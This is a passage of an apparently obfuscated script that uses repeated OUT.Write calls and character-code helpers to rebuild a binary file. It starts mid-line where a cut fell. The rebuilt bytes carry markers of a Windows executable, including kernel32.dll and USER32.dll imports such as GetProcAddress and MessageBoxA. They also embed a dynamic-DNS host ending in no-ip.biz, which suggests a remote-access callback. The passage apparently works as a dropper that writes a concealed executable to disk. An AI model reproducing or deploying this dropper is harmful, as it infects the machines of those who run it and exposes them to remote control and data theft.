6]@S"&C(10)&"!"&C(17)&"Z6q2"&C(18)&"l%bqEe"&C(12)&"&3Ǳb"&C(12)&"ݍ=E_"&C(12)&"1"&C(39)&"("&C(3)&"?=;4"&C(11)&"%=V5"&C(39)&"U۴"&C(30)&"ud"&C(3)&"]w"&C(34)&"s]"&C(28)&""&C(10)&"lzH"&C(25)&"mr"&C(26)&""&C(30)&""&C(10)&"3ɺ"&C(16)&"?"&C(1)&""&C(17)&""&C(30)&"h*5V%=]a<M?]Q$w%ߣ/"&C(39)&"1"&C(22)&C(17)&C(11)&""&C(9)&C(24)&"߰_$"&C(28)&""&C(11)&"5r"&C(7)&"}"&C(23)&C(27)&"h"&C(10)&C(39)&"v"&C(8)&"<"&C(21)&"ٶ~"&C(8)&"q"&C(39)&","&C(1)&C(31)&"k"&C(19)&"?"&C(1)&"o±¼I"&C(18)&"X]"&C(22)&"ASwS7"&C(11)&C(10)&"V"&C(25)&"qQn="&C(6)&"־3tj-<*ysS;"&C(21)&"u3"&C(31)&""&C(39)&"U5.ih~"&C(39)&"uC6u:,J=..!"&C(31)&"=!*"&C(24)&C(25)&"=q1Q%"&C(29)&"G==$"&C(17)&C(26)&"ҵ"&C(4)&"=ݱ"&C(10)&"<ƹ"&C(31)&"$"&C(39)&"6"&C(39)&"^"&C(12)&"Kݣi"&C(28)&"v=}"&C(39)&"<!3=y$!"&C(6)&"u"&C(4)&"&"&C(30)&"&"&C(19)&"&_s"&C(39)&"%"&C(6)&"!!%$$k"&C(3)&"s"&C(22)&C(19)&"fB*Ƃ\z"&C(1)&""&C(34)&""&C(6)&"}"&C(4)&""&C(6)&"B{ͪ"&S(C(24),2)&"+"&C(19)&"%"&C(29)&""&C(34)&C(18)&"墒V6tƿĢSO"&C(7)&"LE "&C(31)&"Һ3|[4s"&C(4)&"{"&C(14)&"9S`I=$2_{X"&C(4)&"XU¹"&C(13)&"h"&C(3)&C(26)&"Ss"&C(4)&""&C(12)&"*"&C(19)&"bP"&C(3)&O&"C"&C(28)&C(9)&C(10)&""&C(22)&"b{Uf{"&C(27)&"HkӾ(ǟ+ȓ"&C(4)&"vKk}g_9"&C(39)&""&C(7)&C(39)&"Ӌ"&C(4)&"ki]-!ab`"&C(28)&"=_i"&C(31)&C(30)&C(3)&C(12)&"^uN"&C(30)&"i=z|"&C(4)&"*lZ{31!im&潜C%"&C(30)&"I*&^"&C(4)&"%[7"&C(5)&"Ե"&C(3)&""&C(1)&"zf&h{"&C(2)&""&C(13)&""&C(26)&"v"&C(17)&""&C(12)&"osI;:O"&C(2)&"*J"&C(31)&"*j"&C(25)&C(2)&C(3)&"}"&C(5)&"!`g!5F"&C(10)&"/"&C(3)&""&C(2)&C(15)&""&C(39)&"-ֵ􍍱h#;2"&C(10)&"%󶱄"&C(31)&""&C(24)&""&C(15)&"8"&C(10)&"ƿ"&C(22)&"ӽfUyeξa"&C(9)&"to]f/"&C(6)&C(9)&"P"&C(28)&"]\8<}"&C(9)&"]c{"&O&" ʘ"&O&"Һ"&C(4)&"˞"&C(19)&"$"&C(11)&""&C(3)&"Ļ:5fA"&C(3)&"r˱#A"&C(24)&"3"&C(23)&"Ͻ4Ș"&S(C(29),2)&C(31)&"dl"&C(3)&"bT-"&C(4)&C(2)&""&O&""&C(2)&"= ++"&C(2)&C(16)&"ҕ2-"&C(2)&"bR&r"&C(14)&"M"&C(4)&"="&C(9)&"3NIĶb60&FT"&C(2)&"?En"&C(5)&""&C(5)&""&S(C(11),2)&""&C(7)&"?"&C(12)&C(11)&C(12)&"M-St<)ҭtzPY;=:׌"&C(12)&"zՖ΍"&C(1)&"xX"&C(30)&C(27)&C(4)&C(6)&"!"&C(34)&"+$"&C(27)&C(25)&C(26)&"&޷"&C(4)&")p"&C(27)&C(31)&C(25)&C(27)&C(21)&C(26)&C(19)&"B"&C(8)&"=ZҨf:6U"&C(11)&"/6᫁n"&C(3)&"q"&C(34)&"$kiP7 "&C(21)&"%=v="&C(15)&"u~"&C(28)&"H"&C(30)&""&C(22)&C(2)&""&C(2)&"k_ۉ"&O&""&C(30)&"?g"&C(22)&"~"&C(17)&"r=Ti"&C(39)&"N)"&C(29)&"C"&C(5)&"=ϩ"&C(22)&"Ƶd%"&C(13)&"!"&C(30)&")Z*IY.bښ"&C(2)&")Hd!Z䊋"&C(18)&"ҷE˴JZ}H"&C(1)&"DY"&C(22)&C(5)&"rĪCZB"&C(12)&"T`"&C(14)&"nڸ"&C(9)&"ձ|T*"&C(5)&""&C(6)&C(27)&C(31)&C(23)&""&C(1)&""&C(26)&""&O&C(23)&"*&0"&C(10)&"$"&C(6)&"!!"&C(30)&"i?<"&C(28)&C(34)&""&C(5)&" "&C(19)&C(34)&"%"&C(26)&"!˩D"&C(6)&"C"&C(29)&"٭"&C(5)&C(27)&","&C(23)&C(15)&C(2)&"!"&C(27)&" ,i W"&C(39)&"*+"&C(30)&C(4)&"$"&C(21)&"Hͨ"&C(31)&C(34)&C(27)&""&C(10)&" !"&C(2)&"8"&C(3)&"dh/"&C(23)&C(6)&""&C(31)&"."&C(15)&"8<7i³"&C(5)&"+,"&C(23)&C(31)&"Čd"&C(4)&"23w ^%"&C(23)&"wF"&C(30)&"("&C(18)&""&C(22)&""&C(12)&"i"&C(30)&"%"&C(7)&C(15)&"J"&C(23)&"e¨"&C(10)&"%"&C(11)&"b"&C(30)&C(8)&"0"&C(20)&C(15)&">f&Ο%<4ZY}gi>"&C(29)&"Y?"&C(15)&"u!T"&C(26)&""&C(6)&C(30)&C(18)&"eB2te"&C(12)&"t"&C(16)&""&C(5)&"/"&C(2)&"Fb"&C(14)&"w"&O&C(20)&""&C(29)&"mC"&C(20)&"%"&C(39)&"d[T"&C(19)&"o"&C(31)&""&C(5)&"j"&C(25)&""&C(1)&C(20)&C(28)&"="&C(6)&"C"&C(39)&C(34)&C(30)&C(27)&C(21)&"S4"&C(2)&"2"&C(22)&""&C(34)&")9"&C(30)&C(5)&"ҩr$"&C(31)&C(24)&" *%u"&C(31)&""&C(24)&"s"&C(31)&""&C(29)&""&C(39)&"-"&C(2)&"5"&C(1)&"HÞm"&C(18)&"s^"&C(15)&"Z"&C(26)&"Y"&C(3)&"ƞ"&C(6)&"+"&C(34)&"V2k"&C(2)&"),"&C(31)&""&C(5)&C(23)&C(25)&"ڷuGRo?"&C(19)&"g2Mt]"&C(23)&C(22)&"|"&C(31)&"G$ ,("&C(6)&C(3)&"|,V2<Nxd("&C(22)&C(1)&C(24)&"\u"&C(31)&""&C(20)&""&C(7)&" 0hc1"&C(34)&C(2)&"Te}9[v.("&C(5)&""&C(23)&C(34)&""&C(5)&C(1)&C(31)&"b"&C(39)&C(2)&"]"&C(16)&"^"&C(8)&"; E^^"&C(28)&""&C(5)&";\S+V3)<"&C(17)&C(27)&C(5)&"c]l?ӓ*"&C(39)&C(25)&"M"&C(23)&"rҲ%"&C(14)&"Z"&C(26)&C(18)&"o"&C(6)&"<̟"&S(C(34),2)&C(29)&"o6"&C(6)&"cMĺF"&C(1)&"${m"&C(7)&"%"&C(13)&"Ќ2K<"&C(3)&"eHv14e"&C(30)&"w"&C(6)&"@sJ^"&C(28)&"{"&C(13)&"ti$"&C(6)&C(19)&C(20)&"B"&C(21)&"%"&C(26)&""&C(30)&"ڍ%U7ވ"&C(27)&"Oo"&C(19)&C(31)&C(23)&"/ "&C(23)&""&C(30)&""&C(21)&"EQj!L-"&S(C(17),2)&"**P"&C(19)&"tMǾ"&C(25)&C(13)&C(29)&""&C(34)&C(20)&C(17)&"hF+"&C(34)&"(x"&C(24)&C(31)&"K_5q1"&C(7)&""&C(10)&C(12)&" "&C(34)&"$"&C(24)&""&C(24)&"FG"&C(19)&""&C(34)&"jPk"&C(25)&C(4)&"麘"&C(11)&C(21)&"^"&C(5)&"t"&C(1)&"@AD kh"&C(39)&C(21)&"<"&C(30)&C(22)&"h"&C(24)&"="&C(1)&"7&8H"&C(13)&"[g"&C(10)&"R):׺,"&C(21)&"ĸ"&C(28)&"N!"&C(27)&C(34)&C(20)&".j"&C(15)&"e$"&C(22)&""&C(23)&")"&C(26)&"DS"&C(27)&"Vy"&C(26)&C(30)&"!Vy"&C(27)&"%īe"&C(19)&"2&"&C(6)&"#S%"&C(2)&C(15)&C(29)&""&C(19)&C(39)&"6"&C(29)&"c"&C(19)&"M5="&C(20)&C(15)&"4k}"&C(6)&"$l%"&C(30)&"d4U&"&C(20)&"Yt"&C(24)&""&C(24)&"2!+>!f"&C(22)&"W{J6%"&C(9)&""&C(27)&"xt("&C(30)&"ψ"&C(11)&"H"&C(19)&"J"&C(19)&"U"&C(34)&"("&C(9)&";@")
OUT.Write("."&C(28)&"(-0!*)"&C(8)&"~"&C(8)&C(30)&"A"&C(28)&"H+!J6Fg_"&C(39)&""&C(12)&" -ƖU {("&C(10)&""&C(5)&""&C(5)&"-"&C(2)&""&C(29)&")"&C(22)&C(17)&"9ʵ"&C(2)&C(8)&C(29)&C(14)&"8g "&C(31)&"h6"&C(9)&"3<"&C(2)&""&C(11)&"]"&C(24)&"-7"&O&"d"&C(10)&"3"&C(7)&"7Í"&C(10)&""&C(18)&"ë("&C(2)&" S"&C(23)&"Td"&C(31)&"L"&C(31)&C(29)&"$}d}ɸ}d!%k"&C(10)&""&C(6)&""&C(10)&"ʶ¶Լ⸸ʽñúֺƸɼҺɽǱǹ"&C(1)&"Žii"&C(13)&"˷м߼͡ "&C(31)&"˹¿ "&C(2)&";"&C(16)&"ۼ²i÷ǼķϽƼ̹ĻܷßƹdչĿki"&C(21)&"¾<ʹ۽ҼQ"&C(19)&"!鷻"&C(7)&"ο˻g<ºZt ŵò_h"&C(17)&"h/"&O&"׼ÿ_"&C(34)&"ɴ"&C(1)&C(31)&"h"&C(2)&"`"&C(11)&""&C(16)&"q̽"&C(28)&""&C(4)&C(17)&"ر"&C(15)&"iĸ"&C(6)&"V9øӾ-iĽĕ"&O&"ڽ7i1ɽT"&C(28)&"ʻSM㱱"&C(24)&"ۿ޷ֿ"&C(25)&"ҹŹɿrɺĺ뼹$^g"&C(31)&"ՙI"&C(31)&"ɸť$*"&C(29)&"غ͸྾"&C(29)&""&C(16)&"_ûB˸"&C(24)&"("&C(18)&C(13)&"渴͠jӼт"&C(17)&""&C(8)&""&C(17)&"l)S"&C(15)&"Mqiڳht?"&C(15)&"<*ox4ct?2v"&C(27)&"(n_kCPŶh7KƑhٽ"&C(11)&"-ut?7~-"&C(21)&"Ms˻gOڷ{it?q"&C(10)&"￾cȎ!ϸ"&C(6)&"gי"&C(30)&"?"&C(13)&"ÿt݉"&C(15)&"[ܺ"&C(23)&""&C(31)&".aq"&C(13)&"#ÿQ͑gź"&C(22)&"й"&C(1)&"i"&C(8)&"C¸Nˈ"&C(16)&"81ԻdԹ"&C(3)&"("&O&""&C(5)&""&C(23)&"п"&C(4)&"ii"&C(17)&"2"&C(5)&""&C(15)&"Ak"&C(30)&"هlU@S/"&C(13)&"I"&C(17)&"ԕ"&C(12)&"ݏ}"&C(21)&"m`8׸̋JW[7BI "&C(31)&"ߟʇ!!ëӋu8c"&C(3)&"oLξGȯٻHhg]"&C(16)&"5шl锺ߺu"&C(12)&"bxȾl$iN gb&=޿i"&C(8)&"}W5;"&C(30)&"b/o͸D3@)2"&C(19)&""&C(10)&"Vȿ("&C(13)&"_[himюn!"&C(27)&"vڀֽqhн"&C(31)&"g6"&C(26)&C(1)&"i"&C(29)&""&C(19)&"{"&C(15)&"ϊ֢`P4LJJ0qȷ"&C(22)&""&C(8)&O&"Ԃ"&C(30)&"Vvx"&C(8)&C(18)&"8ˁά?7U4"&C(4)&"U"&C(20)&""&C(8)&""&C(24)&"_[brW"&C(22)&" Ĺν"&C(12)&C(13)&"T6"&C(15)&"Wq"&C(4)&"m"&C(1)&"h"&C(12)&"DO"&C(21)&"m_cd|"&C(5)&""&C(4)&""&C(12)&"&h"&C(5)&"3"&C(13)&"L}["&C(6)&C(34)&"jᆼV"&C(26)&"84"&C(27)&"ϚYq{b"&C(2)&C(10)&"8v/*"&C(9)&"˿"&C(5)&"j8"&C(8)&"S3I"&C(30)&C(12)&""&C(12)&"x5"&C(12)&C(34)&""&S(C(26),2)&"X/*m"&C(16)&""&C(2)&""&C(27)&")S(I"&C(31)&"Żi"&C(3)&"˷("&C(29)&"iKg!m#ϻYr "&C(29)&"ۢ("&C(4)&""&C(13)&")"&C(21)&"B"&C(30)&C(18)&""&C(6)&"g>Ʋ"&C(2)&"ճժ"&C(29)&"%]e"&C(24)&"ӽp"&C(24)&"ڪ)"&C(24)&"{"&C(27)&"l˳{(¹H"&C(21)&"fnz(]Bт^"&C(22)&" jtnu7/sBҼz\"&C(2)&"ۭh"&C(14)&")t۲!i6r022.ֺ78"&C(18)&"pr?p"&C(2)&""&C(9)&"5BBB<:"&C(39)&"=5Í$j"&C(39)&"=5Ír%"&C(39)&"=5Í%{5$s<5&&;w"&C(39)&"=5Í{"&C(39)&"=5Í{"&C(39)&""&C(39)&"=5Í{%"&C(39)&"=5Í%5s35?5(<:"&C(39)&""&C(21)&"B=5t;5y5)"&C(16)&";kh<ޚ)2"&C(39)&"=<"&C(17)&""&C(24)&"ssr8v۪2;5y;?p=r&="&C(17)&"?6³"&C(2)&"5yHz³G<r&;+i"&C(2)&"k"&C(9)&"`"&C(7)&"H~³r&;5u"&C(19)&"rt5y?"&C(16)&"r<r&)óu=8vsr8v;s"&C(24)&"=5y"&C(19)&"rձ"&S("",358)&"ӳzҳ"&S("",13)&"ӳҳ"&S("",13)&"ӳҳ"&S("",13)&"ӳҳ"&S("",13)&"ӳҳ"&S("",13)&C(1)&"ӳҳ"&S("",13)&C(13)&"ӳҳ"&S("",13)&C(24)&"ӳӳ"&S("",13)&"$ӳӳ"&S("",21)&".ӳ<ӳLӳZӳdӳjӳzӳӳӳ&2"&C(4)&O&""&C(8)&""&C(2)&""&C(22)&S(C(30),2)&""&C(22)&S(C(30),2)&""&C(5)&C(8)&""&C(4)&C(6)&""&C(22)&S(C(30),2)&""&C(5))
OUT.Write(""&C(22)&S(C(30),2)&""&C(5)&""&C(9)&""&C(2)&""&C(22)&S(C(30),2)&""&C(7)&C(5)&""&C(4)&""&C(22)&S(C(30),2)&""&C(9)&""&O&""&O&""&C(6)&""&C(22)&S(C(30),2)&""&C(9)&C(5)&""&C(17)&""&C(22)&S(C(30),2)&"!"&C(19)&C(22)&""&C(27)&C(20)&"$"&C(19)&"$+"&C(23)&"&"&C(2)&"$!"&C(21)&""&S(C(22),2)&"$"&C(23)&"%%"&C(4)&C(23)&C(25)&""&C(30)&"!%"&C(23)&""&C(23)&"+"&C(23)&C(30)&C(23)&"&"&C(23)&""&C(19)&"&!"&C(27)&""&C(5)&C(26)&C(23)&S(C(30),2)&"*"&C(23)&C(21)&C(39)&"&"&C(23)&"󲲲"&C(5)&""&C(23)&C(30)&C(23)&"&"&C(23)&""&C(23)&"+"&C(6)&"!%"&C(21)&S(C(27),2)&" &"&C(23)&"$ "&C(23)&"&"&C(1)&C(34)&C(23)&" ³ﲲZ1X[\"&S(C(5),4)&"^RG[nwyzfqFqqth"&C(5)&"Pjwsjq873iqq"&C(5)&"[nwyzfqKwjj"&C(5)&"QtfiQngwfw~F"&C(5)&"[nwyzfqUwtyjhy"&C(5)&"zb"&C(13)&"K"&C(24)&"U"&C(4)&"X"&C(25)&"K"&C(11)&"U\"&C(4)&"X"&C(29)&"JK%U\"&C(4)&"X"&C(29)&"JK1U\"&C(4)&"X"&C(29)&">J[\"&C(4)&"X"&C(29)&"Jِ"&C(8)&""&C(5)&"5"&S(C(5),2)&"oEMA\9"&C(6)&"z"&C(20)&"K"&C(11)&"SUJK9VUR"&C(4)&"ZŎJ"&C(13)&"z"&C(26)&"oE\"&C(4)&"zU"&C(4)&"ZŎJ"&C(13)&C(20)&"v"&C(7)&S(C(5),2)&"SY8"&C(13)&""&C(7)&"͈"&C(8)&""&C(8)&"MA"&C(6)&""&S(C(5),3)&"RΎJ5RM"&C(21)&"}"&C(17)&"u"&C(25)&C(8)&""&C(13)&C(8)&"8R֎"&C(7)&"ψ-"&C(8)&C(4)&"RzێJy"&C(21)&C(20)&""&C(6)&S(C(5),2)&"ĉ"&S(C(5),4)&C(20)&""&S(C(5),3)&""&S(C(5),3)&C(8)&"z"&C(13)&""&C(17)&C(5)&C(20)&""&S(C(5),3)&""&C(13)&C(8)&""&C(17)&"\"&C(4)&"X"&C(25)&"ŎJz"&C(20)&"\"&C(4)&"ZŎJ"&C(20)&""&C(6)&S(C(5),2)&"JR"&C(13)&""&C(21)&"K"&C(13)&""&C(11)&C(8)&"Œ"&C(25)&C(13)&"K"&C(9)&"5"&C(28)&""&C(26)&"Z"&C(1)&"z"&C(8)&""&C(1)&"J"&C(1)&""&C(5)&"y?"&C(8)&"R"&C(13)&""&S(C(5),3)&"y"&C(13)&"J"&C(1)&C(20)&""&C(5)&""&C(10)&C(8)&"ƈ"&C(7)&"U"&C(4)&"z"&C(4)&"X"&C(29)&""&C(20)&"h"&C(6)&S(C(5),2)&"J"&C(1)&C(9)&""&C(12)&"J"&C(1)&""&C(9)&""&C(5)&"z͈"&C(25)&""&C(17)&C(5)&C(20)&"q"&S(C(4),3)&"JP"&C(17)&"z"&C(8)&"R"&C(13)&"0T9ΎR"&C(1)&C(20)&""&S(C(5),3)&"ĩ"&S(C(5),4)&C(20)&""&S(C(5),3)&""&S(C(5),3)&C(8)&"R"&C(13)&">"&C(5)&C(20)&""&S(C(5),3)&"V"&C(9)&"j"&C(5)&""&C(13)&"v"&C(13)&""&C(20)&""&S(C(5),3)&"kC̆"&C(5)&""&S(C(5),2)&"*"&C(4)&C(20)&S(C(5),2)&C(8)&C(6)&C(8)&"J"&C(13)&"k"&C(4)&"yak"&C(4)&C(5)&C(21)&"z"&C(16)&""&C(1)&""&C(21)&"k"&C(6)&"=Ok"&C(4)&C(5)&"%z"&C(11)&"k"&C(1)&"k"&C(4)&C(5)&"5z"&C(12)&""&C(1)&C(6)&"=4k"&C(4)&C(5)&"E"&C(20)&""&S(C(5),3)&C(20)&"="&C(7)&"z"&C(20)&";"&C(21)&C(16)&C(3)&"z"&C(1)&"<"&C(5)&""&S(C(5),2)&""&C(21)&"k5zKK"&C(4)&"J>ZJ"&C(8)&"N"&C(9)&"W"&S(C(4),3)&"R΃/u)RK"&C(8)&C(9)&"o"&C(13)&"]y"&C(10)&""&C(13)&C(7)&S(C(5),2)&"RVU"&C(4)&"z"&C(4)&"z"&C(4)&"Zو-"&C(4)&"RzL-Z"&C(13)&C(8)&"ǅ"&C(21)&C(6)&"z"&C(26)&"P"&C(9)&"y"&C(11)&"I"&C(6)&S(C(5),2)&C(4)&"x"&C(9)&"o"&C(6)&"W"&C(4)&"Ո"&C(9)&C(5)&"z!J"&C(13)&"H"&C(13)&"$m"&C(5)&""&S(C(5),2)&"o"&C(5)&C(4)&"z"&C(13)&C(4)&"Z("&C(5)&"8"&C(19)&"m"&C(5)&""&S(C(5),2)&"o"&C(5)&"X"&C(4)&"Zo"&C(6)&"]dc`"&C(9)&C(5)&O&"GetModuleHandleA"&N(4)&"GetProcAddress"&O&O&"kernel32.dll"&O&O&"U"&C(15)&O&O&"VW"&C(21)&""&C(14)&"&"&C(15)&"ѤTny"&C(15)&""&C(23)&""&C(19)&""&C(7)&":"&C(19)&"DdɄՋ"&C(20)&C(15)&"4"&C(39)&"N"&C(15)&">"&C(1)&""&C(19)&"j"&C(3)&"j"&O&"j"&O&"j"&C(21)&"$"&C(16)&"@"&O&""&C(15)&"N"&C(2)&O&O&"5"&C(8)&C(16)&"@"&O&"֋h"&C(17)&O&O&C(15)&""&C(15)&"ȋ"&C(1)&"9"&C(10)&""&C(15)&""&C(15)&"yI;w"&C(15)&""&C(15)&""&C(15)&""&C(15)&""&C(15)&"ilF؍"&C(13)&""&C(31)&"fA_ъq"&C(15)&"34"&C(16)&"@"&O&"N"&C(15)&"ʹ"&C(8)&"!"&C(8)&"iCD;"&C(18)&"103*A@="&O&"f"&O&O&"r"&C(15)&""&C(22)&"H"&C(15)&""&C(15)&""&C(15)&"ȁ"&C(31)&"fv"&C(15)&""&C(15)&"i_<"&C(15)&"Ɂ|OA!A"&C(15)&""&C(15)&"L34v@"&O&"J"&C(25)&"x[d"&C(13)&"!`"&C(15)&"i)H"&C(2)&"@=_"&C(3)&O&O&"r/6!"&C(15)&"؍"&C(13)&"V&"&C(15)&""&C(15)&"ч\"&C(15)&""&C(15)&"A"&C(15)&""&C(15)&"鼋!"&C(15)&"l"&C(15)&""&C(15)&""&C(15)&""&C(28)&C(15)&"hy@"&O&""&C(21)&C(4)&C(16)&"@"&O&"χ"&S(C(1),2)&""&C(21)&"PJ8"&C(27)&"r"&C(17)&""&C(19)&""&C(15)&"dA5"&O&C(16)&"@"&O&"e"&O&"t"&O&"hy@"&O&"Why@"&O&"WE։EE"&C(16)&"\|E4"&C(16)&"@"&O&"E"&C(15)&""&C(15)&"ȋ"&C(1)&"9"&C(10)&""&C(15)&""&C(15)&"yIǅ"&O&"f"&O&O&"ǅx4v@"&O&"&"&C(15)&"%1"&C(15)&""&C(15)&"dqEE"&C(1)&"Pǅ|_"&C(3)&O&O&"x!.diqe"&C(13)&""&C(15)&"%L&Q"&C(15)&"%lF_3^"&C(16)&O&"UDV"&C(21)&C(24)&C(16)&"@"&O&""&C(6)&"<"&C(34)&"u"&C(20)&"F"&C(1)&"Ft"&C(4)&"<"&C(34)&"u>"&C(34)&"u"&C(13)&"F"&C(10)&"< ~"&C(6)&"F> "&C(6)&"t"&C(4)&"< ~e"&O&"EP"&C(21)&C(20)&C(16)&"@"&O&"]"&N(3)&"h0"&C(16)&"@"&O&"h,"&C(16)&"@"&O&"4"&N(3)&"E"&C(1)&"YYt"&C(6)&C(15)&"E"&C(3)&"j"&C(10)&"XPVj"&O&"j"&O&""&C(21)&C(4)&C(16)&"@"&O&"P<"&N(3)&"V"&C(21)&S(C(16),2)&"@"&O&"^Vt$"&C(8)&";t$"&C(12)&"s"&C(13)&""&C(6)&"t"&C(2)&"Ѓ"&C(4)&"^j Xj"&C(4)&"P}@"&O&"$"&N(3)&"Y}@"&O&"YË"&C(13)&"}@"&O&"t"&C(17)&"}@"&O&""&C(12)&"QPYYËD$"&C(4)&C(15)&"D$"&C(8)&"Pj"&C(8)&""&C(21)&C(28)&C(16)&"@"&O&"P"&C(21)&C(12)&C(16)&"@"&O&""&N(12)&"}"&N(10)&".~"&N(3)&C(16)&O&O&"}"&N(10)&"J~"&O&O&"$"&C(16)&N(22)&"}"&O&O&C(10)&"~"&O&O&C(30)&"~"&O&O&"~"&O&O&"V~"&O&O&"d~"&O&O&"v~"&O&O&"~"&N(6)&"<~"&N(6)&">"&C(1)&"GetProcAddress"&O&O&"&"&C(1)&"GetModuleHandleA"&O&O&"m"&C(1)&"GetTickCount"&O&O&"KERNEL32.dll"&O&O&""&C(1)&"MessageBoxA"&O&"USER32.dll"&O&O&"}"&O&"ExitProcess"&O&"P"&C(1)&"GetStartupInfoA"&O&""&O&"GetCommandLineA"&O&""&C(1)&"HeapAlloc"&O&"@"&C(1)&"GetProcessHeap"&N(362)&C(2)&O&C(3)&N(3)&" "&O&O&""&C(14)&N(3)&"8"&O&O&""&N(14)&C(1)&O&C(1)&N(3)&"P"&O&O&""&N(14)&C(1)&O&"h"&N(3)&"h"&O&O&""&N(14)&C(1)&N(5)&""&N(17)&C(1)&N(5)&""&N(3)&""&O&O&""&C(8)&N(10)&"H"&O&O&C(20)&N(11)&"("&N(3)&" "&N(3)&"@"&N(3)&C(1)&O&C(8)&N(5)&""&C(4)&N(11)&C(1)&N(11)&C(22)&"?"&O&O&C(26)&"C"&O&O&"&D"&O&O&"&O"&O&O&"*S"&O&O&".W"&O&O&"2P"&O&O&"2["&O&O&"6_"&O&O&":c"&O&O&">g"&O&O&">r"&O&O&">}"&O&O&"Bk"&O&O&"Fo"&O&O&"Bv"&O&O&"Js"&O&O&"J~"&O&C(8)&"R{"&O&"$Vt"&O&O&"B"&O&O&"F"&O&O&"N"&O&O&"J"&O&O&"R")
OUT.Write(O&O&"V"&O&O&"Z"&O&C(16)&"Z"&O&O&"R"&O&O&"V"&O&O&"^"&O&O&"Z"&O&O&"^"&O&C(28)&"f"&O&O&"b"&O&"0b"&O&"4f"&O&"8j"&O&"$n"&O&"(r"&O&O&"V"&O&O&"^"&O&O&"b"&O&O&"f"&O&C(1)&"b"&O&O&"j"&O&O&"n"&O&O&"r"&O&O&"v"&O&O&"z"&O&C(4)&"~"&O&C(1)&"v"&O&O&"z"&O&"8"&O&C(8)&""&O&O&""&O&C(16)&""&O&O&""&O&O&""&O&C(4)&""&O&C(8)&""&O&C(12)&""&O&C(16)&""&O&C(20)&""&O&C(24)&""&O&C(28)&""&O&" "&O&"$"&O&","&O&""&O&""&O&""&N(845)&"-/"&N(28)&"*:;20"&N(25)&")5;;;2/0"&N(22)&"*8;;;;>11.."&N(19)&")8;;<;=;>22.//"&N(16)&"*8;;=;;;;;?0110!,"&N(14)&"4;><<;<=<;>A220,.!"&C(30)&N(13)&">A=<?;>;=>@?0120++"&C(29)&C(30)&N(12)&"=<A==>;==?<?2110/  "&C(22)&C(21)&N(11)&"A=?A@><@;>BGG22./, "&C(24)&C(13)&N(11)&"@C>@@?>>?GG%"&C(20)&"G221,"&C(29)&" "&C(22)&N(11)&"B@A?BAAGG&"&C(3)&C(4)&C(5)&C(17)&"G21/,"&C(30)&C(29)&N(11)&"E@@?BGG$"&C(7)&C(14)&C(8)&C(10)&C(17)&C(18)&C(17)&"G12.!"&C(29)&N(11)&"BAAGG"&C(34)&C(17)&"+"&C(19)&S(C(17),2)&C(23)&C(25)&C(23)&C(26)&C(17)&"G20+"&C(30)&N(11)&"DGG("&C(17)&"!227###"&S(C(27),2)&C(23)&C(18)&C(17)&"G21."&N(11)&"G6"&C(6)&"+22223##"&C(27)&"#"&C(27)&C(31)&C(23)&C(18)&C(8)&"G2+"&N(12)&"G"&C(1)&"220229##"&C(26)&C(27)&"#"&C(27)&C(25)&C(16)&C(12)&C(4)&"G2"&N(13)&"G"&C(2)&"21227##"&C(31)&S(C(27),2)&C(31)&C(25)&C(18)&C(12)&C(10)&C(28)&"G"&N(14)&"G"&C(6)&"1237###"&S(C(31),2)&C(27)&C(23)&C(17)&C(34)&"GG"&N(16)&"G"&C(11)&"223##"&C(26)&C(31)&C(27)&C(17)&C(34)&"GG"&N(19)&"G"&C(6)&"23##"&C(26)&C(17)&C(34)&"GG"&N(22)&"F"&C(9)&"2#"&C(17)&C(39)&"GG"&N(25)&"G"&C(15)&C(34)&"GG"&N(28)&"GG"&N(177)&""&C(31)&""&C(15)&""&C(7)&""&C(3)&""&O&C(1)&""&O&O&""&O&O&""&O&O&"?"&O&O&C(31)&""&O&O&C(15)&""&O&O&C(15)&""&O&O&C(15)&""&O&O&C(15)&""&O&O&C(15)&""&O&O&C(15)&""&O&O&C(15)&""&O&O&C(15)&""&O&O&C(15)&""&O&O&C(15)&""&O&O&C(15)&""&O&O&C(15)&""&O&O&C(31)&""&O&O&""&O&C(1)&""&C(7)&""&C(31)&""&S("",14)&O&O&C(1)&O&C(1)&O&"  "&O&O&C(1)&O&C(8)&O&""&C(8)&O&O&C(1)&N(165)&"4Kq"&S(C(9),2)&",*&ġ\mJ]qcd~|&U$ݲr@N{"&C(18)&C(7)&"]2*Ʈ"&C(13)&"f鄎BgYu"&C(27)&C(15)&"Zra"&C(2)&"K/"&C(23)&C(29)&"#In"&C(20)&"~"&O&""&C(8)&")hX"&C(39)&""&C(17)&""&O&"T"&C(20)&"=1ԭ,2V6"&C(22)&""&C(11)&"Ѝ!+"&C(5)&"{Vįa"&C(29)&"Wl 9UͭB`p_ԋ#fiQj~hV}"&C(15)&"y>Ec(9"&C(20)&"Nt"&O&"j&Ȣ]"&C(11)&""&C(3)&"H"&C(8)&"r"&C(3)&"H4¹c130㉡Z"&C(27)&"61K^>VdTɗQ"&C(2)&""&C(3)&"\(lA"&C(22)&">|7t6+"&C(22)&"J]887j*`fV8Gҙ"&C(15)&"ڭ/"&C(11)&"SJ"&C(16)&"?jBvnԇ#"&C(20)&"uEOJVZg"&C(24)&"tsSh}֐aP4K5"&C(23)&C(17)&O&"(w"&C(12)&C(1)&C(2)&"("&O&"+,r.no-ip.biz"&O&"VZg"&C(24)&"tb"&O&O&"U2vww+dPUcQxxu`%**rwтnpZG[ :I}>r"&C(29)&"r̖u"&C(27)&"Gc"&C(14)&"c"&C(28)&"H`e"&C(30)&"o."&C(39)&"p"&C(21)&""&C(4)&""&C(19)&"Ωf%<^&t=3\O*}V"&C(15)&"Q!"&C(22)&"0FҜw"&C(10)&"yL"&C(18)&"[|sʟ]"&C(30)&""&C(4)&"n"&C(6)&"U"&C(14)&"$4"&C(22)&""&C(18)&O&"?i`x!hb4ouLi(y!4fcSDa$/"&C(5)&""&C(28)&"E"&O&""&C(22)&")fv"&C(9)&""&C(2)&"3"&C(5)&")!"&C(24)&"lS"&C(31)&C(3)&""&C(7)&"&%"&C(27)&""&C(21)&C(9)&"|,Rz5԰Sן<"&C(7)&"N"&C(24)&"r`B{.F#bUu1!s1~")
